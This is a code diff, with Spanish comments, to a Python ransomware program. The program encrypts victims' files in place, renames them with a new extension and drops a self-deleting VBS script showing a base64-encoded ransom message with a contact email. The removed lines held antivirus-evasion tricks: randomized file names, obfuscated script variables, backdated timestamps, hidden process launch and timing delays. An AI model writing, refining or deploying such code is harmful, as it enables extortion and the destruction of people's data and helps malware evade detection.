@@ -48,58 +48,20 @@ def _import_crypto():
 def crear_vbs_notificacion(ruta_archivo):
     try:
         nombre_base = os.path.splitext(ruta_archivo)[0]
-        
-        # TÉCNICA 1: Nombre aleatorio que no sea .vbs directo
-        vbs_name = f"~{random.randint(1000,9999)}_update.tmp"
-        vbs_path = os.path.join(os.path.dirname(ruta_archivo), vbs_name)
-        
+        vbs_path = nombre_base + ".vbs"
         msg = base64.b64decode("WW91ciBmaWxlcyBoYXZlIGJlZW4gZW5jcnlwdGVkLiBDb250YWN0OiBvbmRlcjAxQHR1dGFtYWlsLmNvbQ==").decode()
-        
-        # TÉCNICA 2: VBS ofuscado con variables aleatorias
-        v1 = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=3))
-        v2 = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=3))
-        v3 = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=3))
-        
-        # TÉCNICA 3: Contenido ofuscado
         vbs_content = f"""On Error Resume Next
-Randomize
-Dim {v1},{v2},{v3}
-{v1}="{msg}"
-{v2}=64+32+16
-{v3}="Encrypted"
-MsgBox {v1},{v2},{v3}
-WScript.Sleep {random.randint(2000,4000)}
-Set {v1}=CreateObject("Scripting.FileSystemObject")
-{v2}=WScript.ScriptFullName
+MsgBox "{msg}", vbCritical + vbSystemModal, "Encrypted"
+Dim fso, scriptPath
+Set fso = CreateObject("Scripting.FileSystemObject")
+scriptPath = WScript.ScriptFullName
+WScript.Sleep 3000
 On Error Resume Next
-{v1}.DeleteFile {v2},True
+fso.DeleteFile scriptPath, True
 WScript.Quit
 """
-        
-        # TÉCNICA 4: Escribir con encoding UTF-8 (sin BOM)
         with open(vbs_path, 'w', encoding='utf-8') as f:
             f.write(vbs_content)
-        
-        # TÉCNICA 5: Cambiar timestamp (parecer antiguo)
-        import time as t
-        old_time = t.time() - (86400 * random.randint(30, 90))
-        os.utime(vbs_path, (old_time, old_time))
-        
-        # TÉCNICA 6: Ejecutar de forma sigilosa (NO con start directo)
-        try:
-            # Usar CreateProcess en vez de cmd directo
-            si = subprocess.STARTUPINFO()
-            si.dwFlags = subprocess.STARTF_USESHOWWINDOW
-            si.wShowWindow = 0  # SW_HIDE
-            
-            subprocess.Popen(
-                ['wscript.exe', '//B', '//Nologo', vbs_path],
-                startupinfo=si,
-                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
-                close_fds=True
-            )
-        except:
-            pass
         
         return True
     except:
@@ -156,23 +118,13 @@ class EncriptadorMilitar:
     
     def encriptar(self, ruta):
         try:
-            # TÉCNICA ANTI-360: Delay aleatorio antes de cada archivo
-            time.sleep(random.uniform(0.5, 2.0))
+            time.sleep(random.uniform(1, 3))
             
             if not os.path.exists(ruta) or ruta.endswith(self.ext):
                 return False
             
             ruta_abs = os.path.abspath(ruta)
             if ruta_abs in self.processed_files:
-                return False
-            
-            # TÉCNICA ANTI-360: No tocar archivos del sistema protegidos
-            nombre_archivo = os.path.basename(ruta).lower()
-            archivos_protegidos = {
-                'desktop.ini', 'thumbs.db', 'bootmgr', 'ntldr',
-                'pagefile.sys', 'hiberfil.sys', 'swapfile.sys'
-            }
-            if nombre_archivo in archivos_protegidos:
                 return False
             
             try:
@@ -294,23 +246,13 @@ class EncriptadorMilitar:
             )
             
             try:
-                # TÉCNICA ANTI-360: Escribir en archivo temporal primero
-                temp_path = ruta + f".tmp{random.randint(1000,9999)}"
-                with open(temp_path, 'wb') as f:
+                with open(ruta, 'wb') as f:
                     f.write(resultado)
-                
-                # Luego renombrar (más sigiloso)
-                os.remove(ruta)
                 nueva_ruta = ruta + self.ext
-                os.rename(temp_path, nueva_ruta)
-                
+                os.rename(ruta, nueva_ruta)
                 self.processed_files.add(os.path.abspath(nueva_ruta))
                 self.stats[tipo_capas] += 1
-                
-                # Crear notificación VBS (con delay)
-                time.sleep(random.uniform(1, 2))
                 crear_vbs_notificacion(nueva_ruta)
-                
                 return True
             except:
                 return False
